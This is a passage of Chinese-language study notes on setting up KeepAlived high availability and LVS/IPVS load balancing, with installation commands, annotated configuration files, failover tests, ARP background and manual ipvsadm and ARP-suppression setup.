	在KeepAlived之间，只有作为主的服务器一直会发送VRRP广播包，告诉它还
	活着，此时备节点不会抢占主。当主不可用时，即备节点监听不到主发送来
	的广播包时，就会启动相关服务接管资源，保证业务的连续性。接管速度可
	以小于1秒。VRRP使用加密协议加密发送广播包。
** KeepAlived高可用服务安装实战
   | 主机名            |             IP | 说明   |
   |-------------------+----------------+--------|
   | lb01.lavenliu.com | 192.168.20.150 | Master |
   | lb02.lavenliu.com | 192.168.20.151 | Backup |
	 在两台负载均衡器上进行操作
	 #+BEGIN_EXAMPLE
cd /home/lavenliu/tools
wget http://www.keepalived.org/software/keepalived-1.2.16.tar.gz
tar -xf keepalived-1.2.16.tar.gz
cd keepalived-1.2.16
./configure
# ======================================================================
...
Keepalived configuration
------------------------
Keepalived version       : 1.2.16
Compiler                 : gcc
Compiler flags           : -g -O2
Extra Lib                : -lssl -lcrypto -lcrypt 
Use IPVS Framework       : Yes
IPVS sync daemon support : Yes
IPVS use libnl           : No
fwmark socket support    : Yes
Use VRRP Framework       : Yes
Use VRRP VMAC            : Yes
SNMP support             : No
SHA1 support             : No
Use Debug flags          : No
# ======================================================================
make
make install 
	 #+END_EXAMPLE
*** 配置规范启动
	  #+BEGIN_SRC sh
# 生成启动脚本命令
/bin/cp /usr/local/etc/rc.d/init.d/keepalived /etc/init.d/

# 配置启动脚本的参数
/bin/cp /usr/local/etc/sysconfig/keepalived /etc/sysconfig

# 创建默认的KeepAlived配置文件路径
mkdir /etc/keepalived
/bin/cp /usr/local/etc/keepalived/keepalived.conf /etc/keepalived
/bin/cp /usr/local/sbin/keepalived /usr/sbin
/etc/init.d/keepalived start
ps -ef |grep keep
/etc/init.d/keepalived stop
	  #+END_SRC
** KeepAlived高可用服务配置文件详解及
   #+BEGIN_EXAMPLE
! Configuration File for keepalived

# 全局配置
global_defs {
   notification_email {
     acassen@firewall.loc  # 报警邮件告知谁，收件人
     failover@firewall.loc
     sysadmin@firewall.loc
   }
   notification_email_from Alexandre.Cassen@firewall.loc # 报警邮件的发件人
   smtp_server 192.168.200.1 # 邮件服务器地址
   smtp_connect_timeout 30   # 超时时间
   router_id LVS_DEVEL       # 相当于MySQL的server-id，在一个局域网内，应该唯一
}

# vrrp的实例，VI_1为实例的名字
vrrp_instance VI_1 {
    state MASTER # 服务器的状态，只有MASTER及BACKUP两种状态
    interface eth0 # 通信的网络接口，对外提供服务的网络接口
    virtual_router_id 51 # 当前实例的ID，可以有多个实例
    priority 100 # 优先级设置
    advert_int 1 # 心跳的间隔为1秒，MASTER与BACKUP负载均衡器之间同步检查
    authentication { # 服务器之间通过密码验证，MASTER与BACKUP密码要一致
        auth_type PASS # 两种认证方式（PASS、AH），官方推荐的认证方式为PASS
        auth_pass 1111 # 尽量使用简单的密码，只使用前8个字符
    }
    virtual_ipaddress {
        192.168.200.16 # VIP（一个或多个），绑定到interface eth0上，不写掩码
        192.168.200.17
        192.168.200.18
    }
}

virtual_server 192.168.200.100 443 {
    delay_loop 6
    lb_algo rr
    lb_kind NAT
    nat_mask 255.255.255.0
    persistence_timeout 50
    protocol TCP

    real_server 192.168.201.100 443 {
        weight 1
        SSL_GET {
            url {
              path /
              digest ff20ad2481f97b1754ef3e12ecd3a9cc
            }
            url {
              path /mrtg/
              digest 9b3a0c85a887a256d6939da88aabd8cd
            }
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }
}

virtual_server 10.10.10.2 1358 {
    delay_loop 6
    lb_algo rr 
    lb_kind NAT
    persistence_timeout 50
    protocol TCP

    sorry_server 192.168.200.200 1358

    real_server 192.168.200.2 1358 {
        weight 1
        HTTP_GET {
            url { 
              path /testurl/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            url { 
              path /testurl2/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            url { 
              path /testurl3/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }

    real_server 192.168.200.3 1358 {
        weight 1
        HTTP_GET {
            url { 
              path /testurl/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334c
            }
            url { 
              path /testurl2/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334c
            }
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }
}

virtual_server 10.10.10.3 1358 {
    delay_loop 3
    lb_algo rr 
    lb_kind NAT
    nat_mask 255.255.255.0
    persistence_timeout 50
    protocol TCP

    real_server 192.168.200.4 1358 {
        weight 1
        HTTP_GET {
            url { 
              path /testurl/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            url { 
              path /testurl2/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            url { 
              path /testurl3/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }

    real_server 192.168.200.5 1358 {
        weight 1
        HTTP_GET {
            url { 
              path /testurl/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            url { 
              path /testurl2/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            url { 
              path /testurl3/test.jsp
              digest 640205b7b0fc66c1ea91c463fac6334d
            }
            connect_timeout 3
            nb_get_retry 3
            delay_before_retry 3
        }
    }
}
   #+END_EXAMPLE

   本次实验环境的配置文件为：
   #+BEGIN_EXAMPLE
global_defs {
   notification_email {
     ldc@163.com
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 192.168.200.1
   smtp_connect_timeout 30
   router_id LVS_DEVEL
}

vrrp_instance VI_1 {
    state MASTER
    interface eth1
    virtual_router_id 51
    priority 150
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.250/24
    }
}
   #+END_EXAMPLE
   
   配置完毕，启动KeepAlived服务，
   #+BEGIN_SRC sh
# service keepalived start
# 查看VIP 192.168.20.250是否存在
# ifconfig
# ifconfig命令不能查看到VIP，由于VIP的设置是使用ip命令来设置的，
# 所有，使用ip命令来查看
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN qlen 1000
    link/ether 00:0c:29:7d:57:5a brd ff:ff:ff:ff:ff:ff
    inet6 fe80::20c:29ff:fe7d:575a/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:7d:57:64 brd ff:ff:ff:ff:ff:ff
    inet 192.168.20.150/24 brd 192.168.20.255 scope global eth1
    inet 192.168.20.250/24 scope global secondary eth1
    inet6 fe80::20c:29ff:fe7d:5764/64 scope link 
       valid_lft forever preferred_lft forever
   #+END_SRC
   
   把lb01上的KeepAlived配置文件复制到lb02上，进行少许修改，如下：
   #+BEGIN_EXAMPLE
global_defs {
   notification_email {
     ldc@163.com
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 192.168.200.1
   smtp_connect_timeout 30
   router_id LVS_DEVEL02 # 这里做了修改
}

vrrp_instance VI_1 {
    state BACKUP # 这里做了修改
    interface eth1
    virtual_router_id 51
    priority 100 # 这里做了修改
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.250/24
    }
}
   #+END_EXAMPLE

   配置完毕，启动服务。
   #+BEGIN_SRC sh
# service keepalived start
# ip a |grep 192.168.20.250 # 不会有输出
   #+END_SRC
*** KeepAlived高可用服务实战配置与切换效果测试
	目前，VIP 192.168.20.250在lb01上，现在停止lb01上的KeepAlived服务，
	验证VIP是否会漂移到lb02上，
	#+BEGIN_SRC sh
lb01# service keepalived stop
lb02# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:fc:03:1b brd ff:ff:ff:ff:ff:ff
    inet 192.168.19.138/24 brd 192.168.19.255 scope global eth0
    inet6 fe80::20c:29ff:fefc:31b/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:fc:03:25 brd ff:ff:ff:ff:ff:ff
    inet 192.168.20.151/24 brd 192.168.20.255 scope global eth1
    inet 192.168.20.250/24 scope global secondary eth1
    inet6 fe80::20c:29ff:fefc:325/64 scope link 
       valid_lft forever preferred_lft forever
	#+END_SRC
	
	可以发现，VIP 192.168.20.250已经漂移过来了。
* LVS
  [[http://www.linuxvirtualserver.org/zh/index.html][LVS官方中文文档]]
** IP虚拟服务器软件IPVS
*** IPVS软件的三种IP负载均衡技术
	1. Virtual Server via Network Address Translation(VS/NAT)
	   #+BEGIN_EXAMPLE
	   通过网络地址转换，调度器重写请求报文的目的地址，根据预设的调度
       算法，将请求分派给后端的真实服务器；真实服务器的响应报文通过调
       度器时，报文的源地址被重写，再返回给客户，完成整个负载调度过程。
	   #+END_EXAMPLE
	2. Virtual Server via IP Tunneling(VS/TUN)
	   #+BEGIN_EXAMPLE
	   采用NAT技术时，由于请求和响应报文都必须经过调度器地址重写，当客
       户请求越来越多时，调度器的处理能力将成为瓶颈。为了解决这个问题，
       调度器把请求报文通过IP隧道转发至真实服务器，而真实服务器将响应
       直接返回给客户，所以调度器只处理请求报文。由于一般网络服务应答
       比请求报文大许多，采用VS/TUN技术后，集群系统的最大吞吐量可以提
       高10倍。
	   #+END_EXAMPLE
	3. Virtual Server via Direct Routing(VS/DR)
	   #+BEGIN_EXAMPLE
	   VS/DR通过改写请求报文的MAC地址，将请求发送到真实服务器，而真实
       服务器将响应直接返回给客户。同VS/TUN技术一样，VS/DR技术可极大地
       提高集群系统的伸缩性。这种方法没有IP隧道的开销，对集群中的真实
       服务器也没有必须支持IP隧道协议的要求，但是要求调度器与真实服务
       器都有一块网卡连在同一物理网段上。
	   #+END_EXAMPLE
*** IPVS调度器的八种负载调度算法
	1. 轮叫(Round Robin)
	   #+BEGIN_EXAMPLE
	   调度器通过"轮叫"调度算法将外部请求按顺序轮流分配到集群中的真实
       服务器上，它均等地对待每一台服务器，而不管服务器上实际的连接数
       和系统负载。
	   #+END_EXAMPLE
	2. 加权轮叫(Weighted Round Robin)
	   #+BEGIN_EXAMPLE
	   调度器通过"加权轮叫"调度算法根据真实服务器的不同处理能力来调度
       访问请求。这样可以保证处理能力强的服务器处理更多的访问流量。调
       度器可以自动问询真实服务器的负载情况，并动态地调整其权值。
	   #+END_EXAMPLE
	3. 最少链接(Least Connections)
	   #+BEGIN_EXAMPLE
	   调度器通过"最少连接"调度算法动态地将网络请求调度到已建立的链接
       数最少的服务器上。如果集群系统的真实服务器具有相近的系统性能，
       采用"最小连接"调度算法可以较好地均衡负载。
	   #+END_EXAMPLE
	4. 加权最少链接(Weighted Least Connections)
	   #+BEGIN_EXAMPLE
	   在集群系统中的服务器性能差异较大的情况下，调度器采用"加权最少链
       接"调度算法优化负载均衡性能，具有较高权值的服务器将承受较大比例
       的活动连接负载。调度器可以自动问询真实服务器的负载情况，并动态
       地调整其权值。
	   #+END_EXAMPLE
	5. 基于局部性的最少链接(Locality-Based Least Connections)
	   #+BEGIN_EXAMPLE
	   "基于局部性的最少链接" 调度算法是针对目标IP地址的负载均衡，目前
       主要用于Cache集群系统。该算法根据请求的目标IP地址找出该目标IP地
       址最近使用的服务器，若该服务器 是可用的且没有超载，将请求发送到
       该服务器；若服务器不存在，或者该服务器超载且有服务器处于一半的
       工作负载，则用"最少链接"的原则选出一个可用的服务 器，将请求发送
       到该服务器。
	   #+END_EXAMPLE
	6. 带复制的基于局部性最少链接(Locality-Based Least Connections with Replication)
	   #+BEGIN_EXAMPLE
	   "带复制的基于局部性最少链接"调度算法也是针对目标IP地址的负载均
       衡，目前主要用于Cache集群系统。它与LBLC算法的不同之处是它要维护
       从一个 目标IP地址到一组服务器的映射，而LBLC算法维护从一个目标IP
       地址到一台服务器的映射。该算法根据请求的目标IP地址找出该目标IP
       地址对应的服务 器组，按"最小连接"原则从服务器组中选出一台服务器，
       若服务器没有超载，将请求发送到该服务器，若服务器超载；则按"最小
       连接"原则从这个集群中选出一 台服务器，将该服务器加入到服务器组
       中，将请求发送到该服务器。同时，当该服务器组有一段时间没有被修
       改，将最忙的服务器从服务器组中删除，以降低复制的 程度。
	   #+END_EXAMPLE
	7. 目标地址散列(Destination Hashing)
	   #+BEGIN_EXAMPLE
	   "目标地址散列"调度算法根据请求的目标IP地址，作为散列键(Hash
       Key)从静态分配的散列表找出对应的服务器，若该服务器是可用的且未
       超载，将请求发送到该服务器，否则返回空。
	   #+END_EXAMPLE
	8. 源地址散列(Source Hashing)
	   #+BEGIN_EXAMPLE
	   "源地址散列"调度算法根据请求的源IP地址，作为散列键(Hash Key)
       从静态分配的散列表找出对应的服务器，若该服务器是可用的且未超载，
       将请求发送到该服务器，否则返回空。
	   #+END_EXAMPLE
** 搭建负载均衡服务的需求
   负载均衡（Load Balance）集群提供了一种廉价、有效、透明的方法，来扩
   展网络设置和服务器的负载、带宽、增加吞吐量、加强网络数据处理能力、
   提高网络的灵活性和可用性。

   搭建负载均衡服务的需求：
   1. 把单台计算机无法承受的大规模的并发访问或数据流量分担到多台节点设
      备上分别处理，减少用户等待响应的时间，提升用户体验。
   2. 单个重负载的运算分担到多台节点设备上做并行处理，每个节点设备处理
      结束后，将结果汇总，返回给客户，系统处理能力得到大幅度提高。
   3. 7*24的服务保证，任意一个或多个后端有限节点设备宕机，要求业务不受
      影响。

   在负载均衡集群中，所有计算机节点都应该提供相同的服务。集群负载均衡
   器截获所有对该服务的入站请求。然后将这些请求尽可能平均地分配在后端
   所有集群节点上。
** LVS软件工作层次图
   1. 早在2.2内核时，IPVS以内核补丁的形式出现。
   2. 从2.4.23版本开始，IPVS软件已合并到Linux内核的常用版本的内核补丁
      的集合。
   3. 从2.4.24以后，IPVS已成为Linux官方标准内核的一部分。


   拓扑图

   LVS技术小结：

   LVS的核心模块ipvs是工作在Linux Kernel中，我们使用该软件的时候，不能
   直接配置内核中的ipvs，而需要使用ipvs的管理工具ipvsadm进行管理。
   ipvsadm是工作在用户空间，或者也可通过KeepAlived软件直接管理ipvs，并
   不是通过ipvsadm来管理ipvs。

   小结：
   1. 真正实现调度的工具是IPVS，工作在Linux内核空间
   2. LVS自带的IPVS管理工具是ipvsadm
   3. KeepAlived实现管理IPVS及负载均衡器的高可用
   4. RedHat的Piranha WEB管理工具也可调度IPVS
  
** LVS体系结构与工作原理简单描述
   LVS集群负载均衡器接受服务的所有入站请求，并根据调度算法决定哪个集群
   节点处理回复请求。负载均衡器（简称LB）有时也被称为LVS Direcotr（简
   称Director）。

   LVS中常用的术语，
   #+CAPTION: LVS中常用术语及说明
   | 名称                                    | 缩写 | 说明                                                |
   |-----------------------------------------+------+-----------------------------------------------------|
   | 虚拟IP地址（Virtual IP Address）        | VIP  | VIP为Director用于向客户端计算机提供服务的IP地址。   |
   |                                         |      | 比如：www.lavenliu.com域名就要解析到VIP上提供服务。 |
   |-----------------------------------------+------+-----------------------------------------------------|
   | 真实IP地址（Real Server IP Address）    | RIP  | 集群中的节点使用的IP地址，物理IP地址。              |
   |-----------------------------------------+------+-----------------------------------------------------|
   | Director的IP地址（Director IP Address） | DIP  | Director用于连接内外网络的IP地址，物理网卡上的IP    |
   |                                         |      | 地址。是负载均衡器上的IP。                          |
   |-----------------------------------------+------+-----------------------------------------------------|
   | 客户端主机IP地址（Client IP Address）   | CIP  | 客户端用户计算机请求集群服务器的IP地址，该地址用作  |
   |                                         |      | 发送给集群的请求的源IP地址。                        |

   使用VIP的形式，有利于VIP的漂移。

   LVS集群内部的节点称为真实服务器（Real Server），也叫做集群节点。请
   求集群服务的计算机称为客户端计算机。

   与计算机通常在网上交换数据包的方式相同，客户端计算机、Director和真
   实服务器使用IP地址彼此进行通信。
** LVS的几种模式
   1. NAT     - Network Address Translation
   2. DR      - Direct Routing
   3. TUN     - IP Tunnel
   4. FULLNAT - Full Network Address Translation
*** ARP协议
	ARP（Address Resolution Protocol）协议，是地址解析协议，
	使用ARP协议可实现通过IP地址获得对应主机的物理
	地址（MAC地址）。

	在TCP/IP的网络环境中，每个联网的主机都会被分配一个32位的IP地址，这
	种互联网地址是在网际范围标识主机的一种逻辑地址。为了让报文在物理网
	络上传输，还必须要知道对方目的主机的物理地址（MAC地址）才行。这样
	就存在把IP地址转换成物理地址的转换问题。

	在以太网环境中，为了正确地向目的主机传送报文，必须把
	目的主机的32为IP地址转换成为目的主机的48为以太网地址
	（MAC地址）。这就需要在互联层有一个服务或功能
	将IP地址转换为相应的物理地址，这个服务或者功能
	就是ARP协议。

	所谓地址解析，就死主机在发送帧之前将目标IP地址转换成目标MAC地址的
	过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC
	地址，以保证主机间互相通信的顺利进行。

	ARP协议和DNS有点相像之处。不同点是：DNS是在域名和IP之间的解析；另
	外，ARP协议不需要配置服务，而DNS要配置服务才行。
**** ARP协议工作原理
	 自己总结

     |         主机A |         主机B |
     |---------------+---------------|
     | 192.168.20.10 | 192.168.20.11 | 

	 局域网中的主机A要与主机B进行通信，
	 1. 主机A首先查看本机的ARP缓存，是否存在主机B对应的ARP条目，即主机
        B的MAC地址；
	 2. 如果存在，则直接进行通信；如果不存在，则
		+ 在局域网中进行ARP广播，我需要主机B的MAC地址；
		+ 这时局域网中的机器都收到了该ARP广播，但只有主机B会响应此广播；
		+ 主机B告诉主机A自己的MAC地址；
		+ 主机A将主机B的MAC地址保存到ARP缓存中，发送数据；
	 3. 主机A与主机B相互发送数据；
**** ARP缓存是把双刃剑
	 1. 主机有了ARP缓存表，可以加快ARP的解析速度，减少局域网内广播风暴。
	 2. 正是有了ARP缓存表，给恶意黑客带来了攻击服务器的风险，这个就是
        ARP欺骗攻击。
	 3. 切换路由器或负载均衡器等设备时，可能会导致短时间网络中断。
**** ARP在生产环境产生的问题及解决办法
	 1. ARP病毒，ARP欺骗
	 2. 高可用服务器之间切换时要考虑ARP缓存问题
	 3. 路由器等设备无缝迁移时要考虑ARP缓存问题，例如，更换办公室路由器
**** 服务器切换ARP问题
	 当网络中一台提供服务的机器宕机后，当在其他运行正常的机器添加宕机
	 的机器的IP时，会因为客户端的ARP table cache的地址解析还是宕机的机
	 器的MAC地址。从而导致，即使在其他运行正常的机器添加宕机的机器的IP，
	 也会发生客户依然无法访问的情况。

	 解决办法是：当机器宕机，IP地址迁移到其他机器上时，需要通过arping
	 命令来通知所有网络内机器清楚其本地的ARP table cache，从而使的客户
	 机访问时重新广播获取MAC地址。

	 这也是自己开发脚本实现服务器的高可用时要考虑的问题之一，几乎所有
	 的高可用软件都会考虑这个问题。

	 ARP广播而进行新的地址解析。

	 Linux下的具体命令：
	 #+BEGIN_SRC sh
	 # /sbin/arping -I eth0 -c 3 -s 192.168.20.150 192.168.20.253
     # /sbin/arping -U -I eth0 192.168.20.150
	 #+END_SRC
**** ARP案例
	 现有路由器不稳定，公司增加了新路由器，要求无缝切换，如何实现？
	 #+BEGIN_EXAMPLE
	 1. 旧的配置导入到新的配置里
	 2. 清空客户端的ARP缓存；或重启客户端
	 #+END_EXAMPLE
**** ARP技术点回顾
	 1. 什么是ARP协议
	 2. ARP协议工作原理
	 3. 工作中ARP带来的实际问题和解决方案
		1. 局域网ARP欺骗原理及解决方法
		2. 切换网关路由器，ARP带来的问题
		3. 集群架构中高可用服务器对之间的切换，ARP带来的问题
	 4. 局域网客户端ARP问题的防御
*** DR模式
	LVS只接收入站请求，而不处理请求。后端真实服务器直接响应客户端的请
	求。

	LVS DR模式原理：
	1. 通过更改数据包的MAC地址实现数据包转发的；
	2. 所有真实服务器要与LVS Directors处于一个局域网；

    DR模式特点：
	1. 通过在调度器LB上修改数据包的目的MAC地址实现转发。注意源IP地址仍
       然是CIP，目的IP仍然是VIP。
	2. 请求报文经过调度器，而RS响应处理后的报文无需经过调度器LB。因此，
       并发访问量大时使用效率很高（与NAT模式相比）。
	3. 因为DR模式是通过MAC地址的改写机制实现的转发。因此，所有RS节点和
       调度器LB只能在一个局域网中（小缺点）。
	4. 需要注意RS节点的VIP绑定（lo:vip/32,lo1:vip/32）和ARP抑制问题。
	5. 强调下：RS节点的默认网关不需要是调度器LB的DIP，而直接是IDC机房
       分配的上级路由器的IP（这是RS带有外网IP地址的情况），理论上：只
       要RS可以出外网即可，不是必须要配置外网IP。
	6. 由于DR模式的调度器仅进行了目的MAC地址的改写，因此，调度器LB无法
       改变请求的报文的目的端口（与NAT要区别）。
	7. 当前，调度器LB支持几乎所有的UNIX、Linux系统，但目前不支持
       Windows系统。真实服务器RS节点可以是Windows系统。
	8. 总的来说DR模式效率很高，但是配置也较麻烦，因此，访问量不是特别
       大的公司可以用HAproxy/Nginx取代之。这符合运维的原则：简单、易用、
       高效。日1000-2000W PV或并发请求1万以下都可以考虑用HAProxy/Nginx
       （LVS NAT模式）。
	9. 直接对外的访问业务，例如，web服务做RS节点，RS最好用公网IP地址。
       如果不直接对外的业务，例如，MySQL、存储系统RS节点，最好只用内部
       IP地址。
*** NAT模式
	1. NAT技术将请求的报文（通过DNAT方式改写）和响应的报文（通过SNAT方
       式改写），通过调度器地址重写然后再转发给内部的服务器，报文返回
       时再改写成原来的用户请求的地址。
	2. 只需要在调度器LB上配置公网IP即可，调度器也要有局域网IP和内部RS
       节点通信。
	3. 每台内部RS节点的网关地址必须要配置成调度器LB的局域网内物理网卡
       地址，这样才能确保数据报文返回时仍然经过调度器LB。
	4. 由于请求与响应的数据报文都经过调度器LB，因此，网站访问量大时，
       调度器LB有较大的瓶颈，一般要求最多10-20台节点。
	5. NAT模式支持对IP及端口的转换，即用户请求192.168.20.10:80，可以通
       过调度器转换到RS节点的10.10.20.10:8080（DR和TUN模式不具备的）。
	6. 所有NAT内部RS节点只需配置局域网IP即可。
	7. 由于数据包来回都需要经过调度器。因此，要开启内核转发功能。当然
       也包括iptables防火墙的forward功能（DR和TUN模式不需要）。
*** Tunnel模式
*** 三种模式的总结
	1. NAT模式
	   #+BEGIN_EXAMPLE
	   调度器：入站进行DNAT、出站进行SNAT，入站与出站都经过调度器，可以修改端口
	   #+END_EXAMPLE
	2. DR模式
	   #+BEGIN_EXAMPLE
	   调度器修改数据包的目的MAC地址，入站经过调度器，出站不经过调度器，RS直接
	   返回客户端，不能更改端口，局域网内使用。
	   #+END_EXAMPLE
	3. TUN模式
	   #+BEGIN_EXAMPLE
	   不改变数据包内容，数据包外部封装一个IP头，入站经过调度器，出站不经过调度器，
	   直接返回客户端，不能更改端口，LAN/WAN中使用。调度器和RS之间通过隧道通信。
	   #+END_EXAMPLE
*** LVS三种模式优缺点比较
    | 角色                    | VS/NAT         | VS/TUN               | VS/DR                  |
    |-------------------------+----------------+----------------------+------------------------|
    | Real Server(节点服务器) | config dr gw   | Tunneling            | Non-arp device/tie vip |
    |-------------------------+----------------+----------------------+------------------------|
    | Server Network(网络)    | private        | LAN/WAN              | LAN                    |
    |-------------------------+----------------+----------------------+------------------------|
    | Server Number(节点数量) | low (10~20)    | High (100)           | High (100)             |
    |-------------------------+----------------+----------------------+------------------------|
    | Real Server Gateway     | load balancer  | Own router(能出网)   | Own router(能出网)     |
    |-------------------------+----------------+----------------------+------------------------|
    | 优点                    | 地址和端口转换 | WAN环境              | 性能最高               |
    |-------------------------+----------------+----------------------+------------------------|
    | 缺点                    | 瓶颈大效率低   | 系统需要支持隧道协议 | 不能跨LAN              |
** LVS的调度算法
*** 静态调度算法
**** rr
**** wrr
**** dh
**** sh
*** 动态调度算法
**** lc
**** wlc
**** lblc
**** lblcr
** LVS的调度算法的生产环境选型
   1. 一般的网络服务，如http、mail和MySQL等，常用的LVS调度算法为
	  1. 基本轮叫调度rr算法
	  2. 加权最小连接调度wlc算法
	  3. 加权轮叫调度wrr算法
   2. 基于局部性的最少连接LBLC和带复制的基于局部性最少连接LBLCR主要适
      用于web cache和db cache集群，但是一般很少这样用。 *一致性哈希* 。
   3. 源地址散列调度SH和目标地址散列调度DH可以结合使用在防火墙集群中，
      它们可以保证整个系统的唯一出入口。
   4. 最短预期延时调度SED和不排队调度NQ主要是对处理时间相对比较长的网
      络服务。

   在实际使用中，这些算法的适用范围不限于这些。我们最好参考
   内核中的连接调度
** 安装LVS
   环境准备：
   #+CAPTION: LVS实验环境
   | 主机名             |             IP | 角色                    | 备注                              |
   |--------------------+----------------+-------------------------+-----------------------------------|
   | lb01.lavenliu.com  | 192.168.20.150 | 主LVS调度器（Director） | 对外提供服务的VIP为192.168.20.250 |
   | lb02.lavenliu.com  | 192.168.20.151 | 备LVS调度器（Director） |                                   |
   | web01.lavenliu.com | 192.168.20.152 | RS1（真实服务器）       |                                   |
   | web02.lavenliu.com | 192.168.20.153 | RS2（真实服务器）       |                                   |

   lb01、lb02，
   #+BEGIN_SRC sh
# wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo
# yum makecache
# yum install -y ipvsadm
# ip addr add 192.168.20.250/24 dev eth1 label eth1:1
# ip a
   #+END_SRC
** 手工配置LVS
   #+BEGIN_SRC sh
# ipvsadm --help
############# 常用子命令
# -C --clear # 清空整个配置表
# -A --add-service # 增加虚拟服务
# -E --edit-service # 编辑虚拟服务
# -D --delete-service # 删除虚拟服务
# -a --add-server # 增加RS节点
# -e --edit-server # 编辑RS节点
# -d --delete-server # 删除RS节点
############# 常用选项
# -t --tcp-service host[:port]
# -u --udp-service host[:port]
# -p persistent service
# -r --real-server 
# -w --weight 
# -s --scheduler
#
# 添加一个virtual server实例
# 首先，情况整个配置表
# ipvsadm -C
# ipvsadm --set 30 5 60
# ipvsadm -A -t 192.168.20.250:80 -s rr
# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  192.168.20.250:80 rr
# 目前，该实例下面没有RS节点，现在把web01及web02添加到该实例下面
# ipvsadm -a -t 192.168.20.250:80 -r 192.168.20.152:80 -g
# ipvsadm -a -t 192.168.20.250:80 -r 192.168.20.153:80 -g
# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  192.168.20.250:80 rr
  -> 192.168.20.152:80            Route   1      0          0         
  -> 192.168.20.153:80            Route   1      0          0
   #+END_SRC

   删除方法，
   #+BEGIN_SRC sh
# ipvsadm -D -t 192.168.20.250:80 -s rr
# ipvsadm -D -t 192.168.20.250:80
# ipvsadm -d -t 192.168.20.250:80 -r 192.168.20.152:80
# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  192.168.20.250:80 rr
  -> 192.168.20.153:80            Route   1      0          0
   #+END_SRC

   *web01及web02端的一些手工设置，RS也要绑定VIP，而且是lo网卡* ，
   #+BEGIN_SRC sh
# ip addr add 192.168.20.250/32 dev lo label lo:1
# route add -host 192.168.20.250 dev lo
# 有了以上设置，还是有一些问题，需要在RS端抑制ARP
# 可以先查看这几个值，默认都是0
cat /proc/sys/net/ipv4/conf/lo/arp_ignore
cat /proc/sys/net/ipv4/conf/lo/arp_announce
cat /proc/sys/net/ipv4/conf/all/arp_ignore
cat /proc/sys/net/ipv4/conf/all/arp_announce

# 开始设置
echo "1" > /proc/sys/net/ipv4/conf/lo/arp_ignore
echo "2" > /proc/sys/net/ipv4/conf/lo/arp_announce
echo "1" > /proc/sys/net/ipv4/conf/all/arp_ignore
echo "2" > /proc/sys/net/ipv4/conf/all/arp_announce

   #+END_SRC

   有了以上设置，现在就可以在Windows客户端进行测试了，修改hosts文件，
   指向VIP 192.168.20.250，域名为www.lavenliu.com。

   当RS宕机时，LVS没有对节点的状态进行健康检查的功能。试完成以下功能，
   #+BEGIN_EXAMPLE
   1. 实现LVS对节点的健康检查
      - 检查节点3次，每次间隔2秒，节点不可用就剔除
      - 检查节点3次，每次间隔2秒，节点可用了，就加入到集群
   #+END_EXAMPLE

   arp抑制技术参数说明，
   1. arg_ignore - INTEGER
	  #+BEGIN_EXAMPLE
	  定义对目标地址为本地IP的ARP询问不同的应答模式
	  0 - （默认值）：回应任何网络接口上对任何本地IP地址的arp查询请求
	  1 - 只回答目标IP地址是来访问网络接口本地地址的arp查询请求
	  2 - 只回答目标IP地址是来访问网络接口本地地址的arp查询请求，
          且
	  3 - 不回应该网络界面的arp请求，而只对设置的唯一和连接地址做出
	  4-7 保留未使用
	  8 - 不回应所有（本地地址）的arp查询
	  #+END_EXAMPLE
   2. arp_announce - INTEGER
	  #+BEGIN_EXAMPLE
	  0 - (默认)，在任意网络接口（eth0、eth1、lo）上的任何本地地址
	  1 - 尽量避免不在该网络接口子网段的本地地址做出arp回应。当发起
	  2 - 对查询目标使用最适当的本地地址，在此模式下降忽略这个IP数据包
